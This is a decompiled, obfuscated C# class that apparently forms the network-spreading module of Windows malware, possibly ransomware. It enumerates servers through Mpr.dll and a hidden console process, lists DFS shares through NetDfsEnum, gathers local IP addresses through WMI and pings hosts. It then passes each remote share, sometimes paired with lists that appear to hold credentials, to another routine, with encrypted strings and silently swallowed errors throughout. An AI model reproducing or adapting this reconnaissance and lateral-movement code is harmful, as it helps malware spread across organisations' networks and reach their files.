using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace GlIxuPPoosXGy;

internal sealed class fOzgPUZOHdrgRF
{
	public sealed class NeUccTDcrmlA
	{
		private string _003CServerName_003Ek__BackingField;

		public string ServerName
		{
			get
			{
				return _003CServerName_003Ek__BackingField;
			}
			set
			{
				_003CServerName_003Ek__BackingField = value;
			}
		}
	}

	public enum wRBgihOxpvULNjvq
	{
		ccIgtNzshdtk = 1,
		TqAYSZkjjlz,
		HTfUWPeCIZlPJyam,
		iNjFRhRKrhEnU,
		DRHOtgMRMjOz
	}

	public enum ACNKVrmUfDJaw
	{
		pLDmwsJeznzxFz,
		OmfqhAhtGZkQkL,
		KLNERXtcwkUhezR,
		FVtTYTYasoJX
	}

	public enum QDUQgHFedcjQ
	{
		BiMosdUCFG = 1,
		PKicWCYnrVDKtG = 2,
		ryrLGSOXnpqyU = 4,
		OxtVbnZuGO = 8,
		BYYZPTNbhTsmm = 16,
		ZjBTaMkyRWbVT = 19
	}

	public enum fwxKaIxzvINOwOIK
	{
		motwNUwbRuA,
		VBlneOdpprcdWc,
		bUJmCGWGgsxVM,
		ZZGIeDHGIYlo,
		aGXldOhxMhHAP,
		xUhYirrZrsgqDAG,
		KUpaccwTiLmC,
		lPCJPQcBDOBv,
		ECPSHkBezP,
		DCFdsKHTdLZZkjf,
		DJKZDknMuSkgu,
		ckBAnEZtkeyI
	}

	public sealed class bnNMxgQjQjAgfbs : IEnumerable
	{
		private enum nUtmmmvztRegO
		{
			BtpknpoygXSi = 0,
			AnvOdnExfNzH = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class dvDgXCivsafbbe
		{
			public wRBgihOxpvULNjvq bZNfhaWAhZsUEy;

			public ACNKVrmUfDJaw geZqqlIwDkd;

			public fwxKaIxzvINOwOIK VmrWlUebrSIcmhSX;

			public QDUQgHFedcjQ yMfcFusrrRHv;

			public string dtGaKwgGHQRY;

			public string IkzAnbFcQe;

			public string HHqCkZstCWnFM;

			public string yrRPwxYfrnLrCS;
		}

		private ArrayList EjGASVLVcoSG = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern nUtmmmvztRegO WNetOpenEnumA(wRBgihOxpvULNjvq dwScope, ACNKVrmUfDJaw dwType, QDUQgHFedcjQ dwUsage, dvDgXCivsafbbe p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern nUtmmmvztRegO WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern nUtmmmvztRegO WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(dvDgXCivsafbbe dvDgXCivsafbbe_0, wRBgihOxpvULNjvq wRBgihOxpvULNjvq_0, ACNKVrmUfDJaw acnkvrmUfDJaw_0, QDUQgHFedcjQ qduqgHFedcjQ_0, fwxKaIxzvINOwOIK fwxKaIxzvINOwOIK_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(wRBgihOxpvULNjvq_0, acnkvrmUfDJaw_0, qduqgHFedcjQ_0, dvDgXCivsafbbe_0, out lphEnum) == nUtmmmvztRegO.BtpknpoygXSi)
			{
				nUtmmmvztRegO nUtmmmvztRegO;
				do
				{
					nUtmmmvztRegO = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (nUtmmmvztRegO)
					{
					case nUtmmmvztRegO.AnvOdnExfNzH:
						continue;
					case nUtmmmvztRegO.BtpknpoygXSi:
						Marshal.PtrToStructure(intPtr, dvDgXCivsafbbe_0);
						if (dvDgXCivsafbbe_0.VmrWlUebrSIcmhSX == fwxKaIxzvINOwOIK_0)
						{
							EjGASVLVcoSG.Add(dvDgXCivsafbbe_0.IkzAnbFcQe);
						}
						if ((dvDgXCivsafbbe_0.yMfcFusrrRHv & QDUQgHFedcjQ.PKicWCYnrVDKtG) == QDUQgHFedcjQ.PKicWCYnrVDKtG)
						{
							EnumerateServers(dvDgXCivsafbbe_0, wRBgihOxpvULNjvq_0, acnkvrmUfDJaw_0, qduqgHFedcjQ_0, fwxKaIxzvINOwOIK_0);
						}
						continue;
					}
					break;
				}
				while (nUtmmmvztRegO != nUtmmmvztRegO.AnvOdnExfNzH);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public bnNMxgQjQjAgfbs(wRBgihOxpvULNjvq wRBgihOxpvULNjvq_0, ACNKVrmUfDJaw acnkvrmUfDJaw_0, QDUQgHFedcjQ qduqgHFedcjQ_0, fwxKaIxzvINOwOIK fwxKaIxzvINOwOIK_0)
		{
			dvDgXCivsafbbe dvDgXCivsafbbe_ = new dvDgXCivsafbbe();
			EnumerateServers(dvDgXCivsafbbe_, wRBgihOxpvULNjvq_0, acnkvrmUfDJaw_0, qduqgHFedcjQ_0, fwxKaIxzvINOwOIK_0);
		}

		public IEnumerator GetEnumerator()
		{
			return EjGASVLVcoSG.GetEnumerator();
		}
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct sgrbbzRUuuP
	{
		[MarshalAs(UnmanagedType.LPWStr)]
		public string SsCztOgjtWPSQ;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string gNnLecMKhqfrY;

		public uint jFvwJdsFksjASvW;

		public uint bpfnGHLYomoIn;

		public IntPtr NnEMCZMPTKz;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct nRRDoLuaFGbAcp
	{
		public int jFvwJdsFksjASvW;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string feNItVebTdDqLB;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string INaQGDPTlufM;
	}

	public struct CgtGCMPtGElIh
	{
		public string NMHyrvOyDKb;

		public string[] cQKwmcdNWOl;

		public CgtGCMPtGElIh(string string_0, string[] string_1)
		{
			NMHyrvOyDKb = string_0;
			cQKwmcdNWOl = string_1;
		}
	}

	private sealed class UujNummQyb
	{
		public string AUFbjnbQYJrZ;

		public bool _003CGetIPAddresses_003Eb__5(string string_0)
		{
			return string_0 != AUFbjnbQYJrZ;
		}
	}

	public static List<string> bQjKxeowrlz;

	public static string tNIjkBkPlAFFjkU;

	public static List<string> gfZxCuwEwMVj;

	public static List<string> bIbSxypvfDIpF;

	public static List<string> UtqADMgcWURwXm;

	[NonSerialized]
	internal static GetString getString_0;

	public static List<NeUccTDcrmlA> HWtXrdJVxNIj()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = getString_0(107396857);
			process.StartInfo.Arguments = getString_0(107405037);
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			List<NeUccTDcrmlA> list = new List<NeUccTDcrmlA>();
			while (true)
			{
				if (!process.StandardOutput.EndOfStream)
				{
					string text = process.StandardOutput.ReadLine();
					if (text == getString_0(107404988))
					{
						break;
					}
					if (text != string.Empty && text[0] == '\\' && text[1] == '\\')
					{
						StringBuilder stringBuilder = new StringBuilder();
						for (int i = 2; i < text.Length && text[i] != ' '; i++)
						{
							stringBuilder.Append(text[i]);
						}
						list.Add(new NeUccTDcrmlA
						{
							ServerName = getString_0(107396862) + stringBuilder.ToString() + getString_0(107404975)
						});
					}
					continue;
				}
				process.WaitForExit();
				process.Close();
				return list;
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("Netapi32.dll", CharSet = CharSet.Auto)]
	public static extern int NetDfsEnum([MarshalAs(UnmanagedType.LPWStr)] string GSKExcclLDGyTa, int sWMwvGNwlDgDcg, int ZuKNZqZiAc, out IntPtr dnAetBqaSV, [MarshalAs(UnmanagedType.I4)] out int nScTSZteXSfr, [MarshalAs(UnmanagedType.I4)] ref int LBNmfheeIW);

	public static List<CgtGCMPtGElIh> CiKanKwQOiqLCKmc(string string_0)
	{
		try
		{
			List<CgtGCMPtGElIh> list = new List<CgtGCMPtGElIh>();
			IntPtr dnAetBqaSV = default(IntPtr);
			int nScTSZteXSfr = 0;
			int LBNmfheeIW = 0;
			if (NetDfsEnum(string_0, 3, 268435455, out dnAetBqaSV, out nScTSZteXSfr, ref LBNmfheeIW) == 0)
			{
				for (int i = 0; i < nScTSZteXSfr; i++)
				{
					sgrbbzRUuuP sgrbbzRUuuP = (sgrbbzRUuuP)Marshal.PtrToStructure(dnAetBqaSV + i * Marshal.SizeOf(typeof(sgrbbzRUuuP)), typeof(sgrbbzRUuuP));
					if (sgrbbzRUuuP.SsCztOgjtWPSQ == string_0)
					{
						continue;
					}
					List<string> list2 = new List<string>();
					for (int j = 0; j < sgrbbzRUuuP.bpfnGHLYomoIn; j++)
					{
						IntPtr ptr = new IntPtr(sgrbbzRUuuP.NnEMCZMPTKz.ToInt64() + j * Marshal.SizeOf(typeof(nRRDoLuaFGbAcp)));
						nRRDoLuaFGbAcp nRRDoLuaFGbAcp = (nRRDoLuaFGbAcp)Marshal.PtrToStructure(ptr, typeof(nRRDoLuaFGbAcp));
						if (nRRDoLuaFGbAcp.jFvwJdsFksjASvW == 2)
						{
							list2.Add(Path.Combine(new string[3]
							{
								getString_0(107391195),
								nRRDoLuaFGbAcp.feNItVebTdDqLB,
								nRRDoLuaFGbAcp.INaQGDPTlufM
							}));
						}
					}
					string text = sgrbbzRUuuP.SsCztOgjtWPSQ.Replace(string_0, getString_0(107394075));
					if (text.StartsWith(getString_0(107396862)))
					{
						text = text.Substring(1);
					}
					list.Add(new CgtGCMPtGElIh(text, list2.ToArray()));
				}
			}
			return list;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void tpIfPYJYywgK()
	{
		kdXBbWqHjtnYq.fgwTRLutHHin(getString_0(107404966));
		List<NeUccTDcrmlA> list = HWtXrdJVxNIj();
		List<CgtGCMPtGElIh> list2 = CiKanKwQOiqLCKmc(Environment.MachineName);
		if (list2 != null)
		{
			foreach (CgtGCMPtGElIh item in list2)
			{
				string[] cQKwmcdNWOl = item.cQKwmcdNWOl;
				foreach (string text in cQKwmcdNWOl)
				{
					if (text.Contains(Environment.MachineName))
					{
						continue;
					}
					try
					{
						if (kdXBbWqHjtnYq.yxYUzXQcSUSLG == getString_0(107397004))
						{
							for (int j = 0; j < gfZxCuwEwMVj.Count; j++)
							{
								kdXBbWqHjtnYq.WMwWOqjOFtUT(getString_0(107392744), getString_0(107393135) + text + getString_0(107392690) + gfZxCuwEwMVj[j] + getString_0(107392709) + bIbSxypvfDIpF[j]);
							}
						}
						else
						{
							kdXBbWqHjtnYq.WMwWOqjOFtUT(getString_0(107392744), getString_0(107393135) + text);
						}
						kdXBbWqHjtnYq.tkcHcCnvalC.Add(text.Replace(getString_0(107391208), getString_0(107394075)));
					}
					catch
					{
					}
				}
			}
		}
		if (list == null)
		{
			return;
		}
		foreach (NeUccTDcrmlA item2 in list)
		{
			if (item2.ServerName.Contains(Environment.MachineName))
			{
				continue;
			}
			try
			{
				if (kdXBbWqHjtnYq.yxYUzXQcSUSLG == getString_0(107397004))
				{
					for (int k = 0; k < gfZxCuwEwMVj.Count; k++)
					{
						kdXBbWqHjtnYq.WMwWOqjOFtUT(getString_0(107392744), getString_0(107393135) + item2.ServerName + getString_0(107392690) + gfZxCuwEwMVj[k] + getString_0(107392709) + bIbSxypvfDIpF[k]);
					}
				}
				else
				{
					kdXBbWqHjtnYq.WMwWOqjOFtUT(getString_0(107392744), getString_0(107393135) + item2.ServerName);
				}
				kdXBbWqHjtnYq.tkcHcCnvalC.Add(item2.ServerName.Replace(getString_0(107391208), getString_0(107394075)));
			}
			catch
			{
			}
		}
	}

	public static bool LiQOxkHwXyG(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static List<string> efuPlbNlEmCBzbN()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107405361));
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item(getString_0(107405328)))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item(getString_0(107405315));
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			for (int j = 0; j < array4.Length; j++)
			{
				UujNummQyb CS_0024_003C_003E8__locals0 = new UujNummQyb();
				CS_0024_003C_003E8__locals0.AUFbjnbQYJrZ = array4[j];
				if (CS_0024_003C_003E8__locals0.AUFbjnbQYJrZ.Contains(getString_0(107405270)))
				{
					array = array.Where((string string_0) => string_0 != CS_0024_003C_003E8__locals0.AUFbjnbQYJrZ).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}

	static fOzgPUZOHdrgRF()
	{
		Strings.CreateGetStringDelegate(typeof(fOzgPUZOHdrgRF));
		bQjKxeowrlz = new List<string>();
		tNIjkBkPlAFFjkU = getString_0(107394075);
		gfZxCuwEwMVj = new List<string>();
		bIbSxypvfDIpF = new List<string>();
		UtqADMgcWURwXm = new List<string>();
	}
}
